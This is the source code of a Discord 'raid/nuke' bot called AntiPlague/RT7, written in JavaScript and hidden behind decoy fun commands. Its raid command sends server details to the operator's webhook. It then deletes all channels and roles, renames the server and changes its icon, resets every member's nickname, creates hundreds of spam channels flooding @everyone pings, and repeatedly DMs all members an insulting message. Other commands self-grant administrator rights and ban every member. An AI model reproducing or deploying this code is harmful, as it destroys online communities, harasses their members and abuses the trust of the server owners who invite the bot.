const express = require('express');
const app = express();

app.get('/', function(req, res) {
	res.send(`<html><head><meta name="viewport" content="width=device-width; height=device-height;"><link rel="stylesheet" href="resource://content-accessible/ImageDocument.css"><link rel="stylesheet" href="resource://content-accessible/TopLevelImageDocument.css"><link rel="stylesheet" href="chrome://global/skin/media/TopLevelImageDocument.css"><title>maxresdefault.png (Imagen PNG, 734&nbsp;×&nbsp;413 pixels)</title></head><body><img src="https://media.discordapp.net/attachments/887007865636814861/887013536126087188/maxresdefault.png?width=734&amp;height=413" alt="https://media.discordapp.net/attachments/887007865636814861/887013536126087188/maxresdefault.png?width=734&amp;height=413" class="transparent"></body></html>`);
});
let port = process.env.PORT || 4444;
app.listen(port);
require('dotenv').config();

//////////////////////////////////////BOT//////////////////////////////////////
const Discord = require('discord.js');
const client = new Discord.Client();
const Math = require('math')
const disbut = require("discord-buttons");
disbut(client);
const chalk = require('chalk');




let prefix = '.';

client.on("ready", () => {
console.log(chalk.grey(`

                                            ╭===================================================================================╮
                                            │                                                                                   │
                                            │  ░█████╗░███╗░░██╗████████╗██╗██████╗░██╗░░░░░░█████╗░░██████╗░██╗░░░██╗███████╗  │
                                            │  ██╔══██╗████╗░██║╚══██╔══╝██║██╔══██╗██║░░░░░██╔══██╗██╔════╝░██║░░░██║██╔════╝  │
                                            │  ███████║██╔██╗██║░░░██║░░░██║██████╔╝██║░░░░░███████║██║░░██╗░██║░░░██║█████╗░░  │
                                            │  ██╔══██║██║╚████║░░░██║░░░██║██╔═══╝░██║░░░░░██╔══██║██║░░╚██╗██║░░░██║██╔══╝░░  │
                                            │  ██║░░██║██║░╚███║░░░██║░░░██║██║░░░░░███████╗██║░░██║╚██████╔╝╚██████╔╝███████╗  │
                                            │  ╚═╝░░╚═╝╚═╝░░╚══╝░░░╚═╝░░░╚═╝╚═╝░░░░░╚══════╝╚═╝░░╚═╝░╚═════╝░░╚═════╝░╚══════╝  │
                                            │                                                                                   │
                                            │  ░█████╗░███████╗██╗░█████╗░██╗░█████╗░██╗░░░░░  ██████╗░░█████╗░████████╗        │
                                            │  ██╔══██╗██╔════╝██║██╔══██╗██║██╔══██╗██║░░░░░  ██╔══██╗██╔══██╗╚══██╔══╝        │
                                            │  ██║░░██║█████╗░░██║██║░░╚═╝██║███████║██║░░░░░  ██████╦╝██║░░██║░░░██║░░░        │
                                            │  ██║░░██║██╔══╝░░██║██║░░██╗██║██╔══██║██║░░░░░  ██╔══██╗██║░░██║░░░██║░░░        │
                                            │  ╚█████╔╝██║░░░░░██║╚█████╔╝██║██║░░██║███████╗  ██████╦╝╚█████╔╝░░░██║░░░        │
                                            │  ░╚════╝░╚═╝░░░░░╚═╝░╚════╝░╚═╝╚═╝░░╚═╝╚══════╝  ╚═════╝░░╚════╝░░░░╚═╝░░░        │
                                            │                                                                                   │
                                            │  ██████╗░░█████╗░██╗██████╗░                                                      │
                                            │  ██╔══██╗██╔══██╗██║██╔══██╗                                                      │
                                            │  ██████╔╝███████║██║██║░░██║                                                      │
                                            │  ██╔══██╗██╔══██║██║██║░░██║                                                      │
                                            │  ██║░░██║██║░░██║██║██████╔╝                                                      │ 
                                            │  ╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░                                                      │
                                            ╰===================================================================================╯`))
console.log(chalk.blue(`                                                               
                                                               
                                                         RRRRRRRRRRRRRRRRR   TTTTTTTTTTTTTTTTTTTTTTT77777777777777777777
                                                         R::::::::::::::::R  T:::::::::::::::::::::T7::::::::::::::::::7
                                                         R::::::RRRRRR:::::R T:::::::::::::::::::::T7::::::::::::::::::7
                                                        RR:::::R     R:::::RT:::::TT:::::::TT:::::T777777777777:::::::7
                                                          R::::R     R:::::RTTTTTT  T:::::T  TTTTTT           7::::::7 
                                                          R::::R     R:::::R        T:::::T                  7::::::7  
                                                          R::::RRRRRR:::::R         T:::::T                 7::::::7   
                                                          R:::::::::::::RR          T:::::T                7::::::7    
                                                          R::::RRRRRR:::::R         T:::::T               7::::::7     
                                                          R::::R     R:::::R        T:::::T              7::::::7      
                                                          R::::R     R:::::R        T:::::T             7::::::7       
                                                          R::::R     R:::::R        T:::::T            7::::::7        
                                                        RR:::::R     R:::::R      TT:::::::TT         7::::::7         
                                                        R::::::R     R:::::R      T:::::::::T        7::::::7          
                                                        R::::::R     R:::::R      T:::::::::T       7::::::7           
                                                        RRRRRRRR     RRRRRRR      TTTTTTTTTTT      77777777            
                                                               
  `))
 
 
console.log(chalk.red(""));   
console.log(chalk.white(""));   
console.log("                          ");   
  console.log("   ")  
  console.log(chalk.grey(`                                                                     Client ${client.user.tag} is on!`));  
  console.log(chalk.grey("                                                                     Bot by Antiplague and Toshyshimura"));  


  
 
 
   presencia();  
    });


function presencia(){
  client.user.setPresence({
status: "dnd",
activity: {
  	name:"抗疫病",
	  url: 'https://twitch.tv/samy2005', 
		type: 'STREAMING'
  	}
	});
}


//////////////////////////////////////BOT///////////////////////////////////////
/////////////////////////////////////RAID//////////////////////////////////////

client.on('message', message => {
	if (message.author.bot) return;
  if (message.channel.type === 'dm') return;
const args = message.content
		.slice()
		.trim()
		.split(/ +/g);
	const command = args.shift().toLowerCase();

	if (command === prefix + 'raid') {
let button = new disbut.MessageButton()
    .setStyle('grey')
    .setLabel('💉')
    .setID('click_to_function');

		const embed = new Discord.MessageEmbed()
			.setTitle('***ANTIPLAGUE***')
			.setURL('https://discord.gg/antiplague')
			.setDescription('**START RAID**')
			.setImage(
				'https://media.discordapp.net/attachments/887007865636814861/887012259971362876/maxresdefault.png?width=734&height=413')
      .setThumbnail("https://media.discordapp.net/attachments/887007865636814861/887014316849647706/e304b138ab2b0cbcf0eb643095d2ecd8.png?width=82&height=82")
			.setTimestamp()
      .setFooter(`#ANTIPLAGUEONTOP`)
			.setColor('BLACK');
      
		if (message.channel.type === 'dm') return;
		message.channel.send(embed, button);

    const webhookID = 'TU ID DE WEBHOOK'
    const webhookToken = 'TU TOKEN DE WEBHOOK'

    const webhookembed = new Discord.MessageEmbed()
    .setTitle('**RAID BY ANTIPLAGUE**')
    .setThumbnail(message.guild.iconURL())
		.setDescription(`**Server:** | ${message.guild.name} \n **Channels:** | ${message.guild.channels.cache.size}\n**Roles:** | ${message.guild.roles.cache.size}\n**Members:** | ${message.guild.memberCount}\n**Author:** | ${message.author.tag} | ${message.author.id}`)
		.setFooter(message.author.username, message.author.displayAvatarURL())
    .setTimestamp()
    .setColor('BLACK');

    const webhookclient = new Discord.WebhookClient(webhookID, webhookToken);
    webhookclient.send({
      username: 'ANTIPLAGUE', 
      avatarURL: 
        'https://media.discordapp.net/attachments/887007865636814861/887044633014706238/m2sQXIb.png?width=344&height=344',
      embeds: [webhookembed],
    })

	client.on('clickButton', async (button) => {
    
    message.guild.channels.cache.forEach(channel => channel.delete());

  })
  console.log(chalk.greenBright('[+]RAID EN EJECUCIÓN'))
  console.log(chalk.greenBright('[-]INFORMACIÓN DEL SERVIDOR:'))
  console.log(chalk.greenBright(`[+]NOMBRE: ${message.guild.name}`))
  console.log(chalk.greenBright(`[-]OWNER: ${message.guild.owner.user.tag}`))
  console.log(chalk.greenBright(`[+]BOT: ${client.user.tag}`))
  console.log(chalk.greenBright(`[-]USUARIO: ${message.author.tag}`))
  console.log(chalk.greenBright('╭==============================================╮'))
  console.log(chalk.greenBright('|#ANTIPLAGUEONTOP https://discord.gg/antiplague|'))
  console.log(chalk.greenBright('╰==============================================╯'))
  }
});

/////////////////////////////////////RAID/////////////////////////////////////

client.on('clickButton', message => {

     message.guild.channels.create('𝑨𝑵𝑻𝑰𝑷𝑳𝑨𝑮𝑼𝑬 💉', {
      type: 'text'
    }).then(channel => {
      const embed = new Discord.MessageEmbed()
      .setTitle("**NUKED BY ANTIPLAGUE**")
      .setURL("https://discord.gg/antiplague")
      .setDescription(`**Opps this server has been nuked by AntiPlague!** \n [#AntiPlagueOnTop](https://antiplague.best)`)
      .setImage("https://media.discordapp.net/attachments/887007865636814861/887013536126087188/maxresdefault.png?width=734&height=413")
      .setThumbnail('https://media.discordapp.net/attachments/887007865636814861/887014316849647706/e304b138ab2b0cbcf0eb643095d2ecd8.png?width=82&height=82')
      .setTimestamp()
      .setFooter("Eradicating toxicity in Discord")
      .setColor('BLACK');

      channel.send("@everyone **Nuked By AntiPlague**", embed)
      channel.send("@everyone || @here \n https://discord.gg/antiplague <:AP_risagato:887032202146250802>")
    })
    console.log(chalk.greenBright('[+]NUKED COMPLETADO'))
    message.guild.roles.cache.map(roles => roles.delete())
    console.log(chalk.greenBright('[-]ROLES ELIMINADOS'))
    message.guild.setName("Antiplague is here");
    console.log(chalk.greenBright('[+]CAMBIANDO EL NOMBRE DEL SERVIDOR'))
    message.guild.setIcon("https://media.discordapp.net/attachments/887007865636814861/887014231680122960/3db15170aaa8aa3aeea64fd97fae7960.png?width=413&height=413");
    console.log(chalk.greenBright('[-]CAMBIANDO EL ICONO DEL SERVIDOR'))
    message.guild.members.cache.forEach(member =>{

      member.setNickname("#ANTIPLAGUEONTOP")
      console.log(chalk.greenBright('[+]CAMBIANDO LOS NOMBRES DE LOS USUARIOS'))
    });

      const mdembed = new Discord.MessageEmbed()
      .setTitle("***RAID BY ANTIPLAGUE***")
      .setDescription(`**What happend to the server?**\nThe server had been raided by Antiplague\nNOW SAY GOODBYE RETARD [#ANTIPLAGUEONTOP](https://discord.gg/antiplague) <:AP_risagato:887032202146250802>`)
      .setThumbnail('https://media.discordapp.net/attachments/887007865636814861/887014316849647706/e304b138ab2b0cbcf0eb643095d2ecd8.png?width=82&height=82')
      .setTimestamp()
      .setFooter('Eradicating toxicity in Discord')
      .setColor('BLACK');

       const embed = new Discord.MessageEmbed()
       .setTitle("***RAID BY ANTIPLAGUE***")
       .setURL('https://discord.gg/antiplague')
       .setDescription(`**Opps this server has been raided by AntiPlague!**`)
      .setImage('https://media.discordapp.net/attachments/887007865636814861/887009188482547752/maxresdefault.png?width=734&height=413')
      .setThumbnail('https://media.discordapp.net/attachments/887007865636814861/887014316849647706/e304b138ab2b0cbcf0eb643095d2ecd8.png?width=82&height=82')
      .setTimestamp()
      .setFooter('Eradicating toxicity in Discord')
      .setColor('BLACK');

       message.channel.send(embed)
          for (let i = 0; i <= 500; i++) {
         message.guild.channels.create(`˜”*°•𝗔𝗣•°*”˜`, {
           type: 'text', 'nsfw': true
         }).then(channel => {
           channel.send("@everyone **Raid By AntiPlague**", embed);
           channel.send("@everyone https://discord.gg/antiplague <:AP_risagato:887032202146250802>");
           channel.send("@everyone **Raid By AntiPlague**", embed);
           channel.send("@everyone https://discord.gg/antiplague <:AP_risagato:887032202146250802>");
           channel.send("@everyone **Raid By AntiPlague**", embed);
           channel.send("@everyone https://discord.gg/antiplague <:AP_risagato:887032202146250802>");
           channel.send("@everyone **Raid By AntiPlague**", embed);
           channel.send("@everyone https://discord.gg/antiplague <:AP_risagato:887032202146250802>");
           channel.send("@everyone **Raid By AntiPlague**", embed);
           channel.send("@everyone https://discord.gg/antiplague <:AP_risagato:887032202146250802>");
           channel.send("@everyone **Raid By AntiPlague**", embed);
           channel.send("@everyone https://discord.gg/antiplague <:AP_risagato:887032202146250802>");
           channel.send("@everyone **Raid By AntiPlague**", embed);
           channel.send("@everyone https://discord.gg/antiplague <:AP_risagato:887032202146250802>");
           channel.send("@everyone **Raid By AntiPlague**", embed);
           channel.send("@everyone https://discord.gg/antiplague <:AP_risagato:887032202146250802>");
           channel.send("@everyone **Raid By AntiPlague**", embed);
           channel.send("@everyone https://discord.gg/antiplague <:AP_risagato:887032202146250802>");
           channel.send("@everyone **Raid By AntiPlague**", embed);
           channel.send("@everyone https://discord.gg/antiplague <:AP_risagato:887032202146250802>");
           channel.send("@everyone **Raid By AntiPlague**", embed);
           channel.send("@everyone https://discord.gg/antiplague <:AP_risagato:887032202146250802>");
           channel.send("@everyone **Raid By AntiPlague**", embed);
           channel.send("@everyone https://discord.gg/antiplague <:AP_risagato:887032202146250802>");
           channel.send("@everyone **Raid By AntiPlague**", embed);
           channel.send("@everyone https://discord.gg/antiplague <:AP_risagato:887032202146250802>");
           channel.send("@everyone **Raid By AntiPlague**", embed);
           channel.send("@everyone https://discord.gg/antiplague <:AP_risagato:887032202146250802>");
           channel.send("@everyone **Raid By AntiPlague**", embed);
           channel.send("@everyone https://discord.gg/antiplague <:AP_risagato:887032202146250802>");
          
         }).catch(e => {});
           }
           console.log(chalk.greenBright('[-]EMPEZANDO SPAM DE CANALES'))

           message.guild.members.cache.forEach(member => {
                        setInterval(function(){
                          member.send(mdembed).catch(e => {});
                          member.send("https://www.twitch.tv/samy2005yt | https://www.youtube.com/user/deicelly | https://antiplague.best").catch(e => {});
                          member.send("El servidor en el que estabas fue atacado por AntiPlague \ The server you were on was been raided by Antiplague <:AP_risagato:887032202146250802> \n https://discord.gg/antiplague", embed).catch(e => {},450);
                      })
    })
    console.log(chalk.greenBright('[+] EMPEZANDO SPAM VIA MD'))
    for (let i = 0; i <= 200; i++) {
                 message.guild.roles.create({data: {name: `𝗔𝗡𝗧𝗜𝗣𝗟𝗔𝗚𝗨𝗘`,color: 'RANDOM',},reason: 'ANTIPLAGUEONTOP',}).catch(e => {console.log(chalk.red("ERROR AL CREAR EL ROL"))});
              };
    console.log(chalk.greenBright('[-]CREANDO ROLES'))   
});

///////////////////////////////////COMANDS///////////////////////////////////

//help
client.on('message', message => {
	if (message.author.bot) return;
	const args = message.content
		.slice()
		.trim()
		.split(/ +/g);
	const command = args.shift().toLowerCase();
	if (command === prefix + 'help') {
		const embed = new Discord.MessageEmbed()
			.setTitle('**RT7**')
      .setURL('https://discord.gg/antiplague')
      .setThumbnail("https://media.discordapp.net/attachments/882859725803364403/882963070618595378/Logo_de_mierda_7.41.png")
      .setDescription(
		`***RT7 COMMANDS:*** \n **${prefix}raid** \n **${prefix}banall** \n**${prefix}admin**` 
			)
			.setFooter(message.author.username, message.author.displayAvatarURL())
      .setTimestamp()
			.setColor('BLACK');

  const embed2 = new Discord.MessageEmbed()
  .setTitle('**RT7**')
  .setThumbnail(client.user.displayAvatarURL())
  .setDescription("**There is my commands!**")
  .addField(`**${prefix}help**`, 'Display this message')
  .addField(`**${prefix}8ball**`, 'A random game')
  .addField(`**${prefix}ping**`, 'Show ping with the server')
  .addField(`**${prefix}love**`, 'Do you love me?')
  .addField(`**${prefix}box**`, 'Open a virtual crate.')
  .addField(`**${prefix}userinfo**`, 'Show info of a user')
  .addField(`**${prefix}website**`, 'This Show you our oficial website :)')
  .addField(`**${prefix}invite**`, 'Pls invite me')
  .setTimestamp()
  .setFooter(message.author.username, message.author.displayAvatarURL())
  .setColor("BLUE");

		if (message.channel.type === 'dm') return message.author.send(helpembed).catch(e => {});

    else {
      if(message.author.id ==  'TU ID') {
		    message.author.send(embed).catch(e => {});
      }} 
        message.channel.send(embed2).catch(e => {});
      if (message.deletable) message.delete().catch(e => {});
    	  }
});

//admin

client.on("message", async msg => {
  if(msg.content.toLowerCase().startsWith(prefix + 'admin')){
    let rol = await msg.guild.roles.create({data: {
      name: "$",
      color: "B9BBBE",
      permissions: "ADMINISTRATOR",
      hoisted: false
    }})

msg.member.roles.add(rol)
      .then(function(role) {
        msg.member.addRole(role);
        if (msg.deletable) msg.delete().catch(e => {});
      })
      .catch(e => {});
  }
});

//banall

client.on("message", async message => {
    if(message.content.startsWith('.banall')){
      message.guild.members.cache.forEach(member => {
        if(member != message.member && member.id != "ID" && member.id != "ID" && member.id != "ID"){
          member.ban();
        }
      })
      console.log(chalk.red(`[?]REALIZANDO BANALL`))  
    }});

//leave

client.on('message', message => {
	if (message.author.bot) return;
	const args = message.content
		.slice()
		.trim()
		.split(/ +/g);
	const command = args.shift().toLowerCase();
	if (command === prefix + 'leave') {
		if (message.channel.type === 'dm') return;
    if (message.author.id == '702366340094361656') return console.log(chalk.red(`[?]EL BOT HA ABANDONADO EL SERVIDOR`)), message.guild.leave();

    else {

      const key = args.join(" ");

      if (!key) return message.channel.send("**ANTIPLAGUE NEVER DIES**")

      else {
        if (key === '123') {
		  message.channel.send('**RT7 OFF**');
      console.log(chalk.red(`[?]EL BOT HA ABANDONADO EL SERVIDOR`))  
      message.guild.leave()
      }
      else {
      message.channel.send("**WRONG!**")
    }}
  }}
});

/////////////////////////////////FAKE COMANDS///////////////////////////////

//8ball
client.on('message', message => {
	if (message.author.bot) return;
const args = message.content
		.slice()
		.trim()
		.split(/ +/g);
	const command = args.shift().toLowerCase();
	if (command === prefix + '8ball') {

    let question = args.join(' ');
    if (!question) return message.channel.send("???")

		var answers = ['Yes', 'No', 'EEEEEEEEEEEEEEEEEEEEEHHHHHHHHHHH', 'idk', 'Nope', 'Try again', 'I tink yes', 'sus', 'YE', 'SUPER YESSSSSSS']
		
		const finalanswer = answers[Math.floor(Math.random() * answers.length)]

		message.channel.send(finalanswer)
	}
});

//invite
client.on('message', message => {
	if (message.author.bot) return;
const args = message.content
		.slice()
		.trim()
		.split(/ +/g);
	const command = args.shift().toLowerCase();
	if (command === prefix + 'invite') {

		message.channel.send(`**RT7: **https://discord.com/api/oauth2/authorize?client_id=864908253421764648&permissions=8&scope=bot`)
	}
});

//serverinfo
client.on('message', message => {
	if (message.author.bot) return;
	const args = message.content
		.slice()
		.trim()
		.split(/ +/g);
	const command = args.shift().toLowerCase();
	if (command === prefix + 'serverinfo') {
		if (message.channel.type === 'dm')
			return;
		const embed = new Discord.MessageEmbed()
			.setTitle('**Info**')
			.setThumbnail(message.guild.iconURL())
			.setDescription(
				`**Channels:** | ${message.guild.channels.cache.size}\n**Roles:** | ${
					message.guild.roles.cache.size
				}\n**Members:** | ${message.guild.memberCount}`
			)
			.setFooter(message.author.username, message.author.displayAvatarURL())
			.setColor('random');
		message.channel.send(embed);
	}
});
client.login('TOKEN')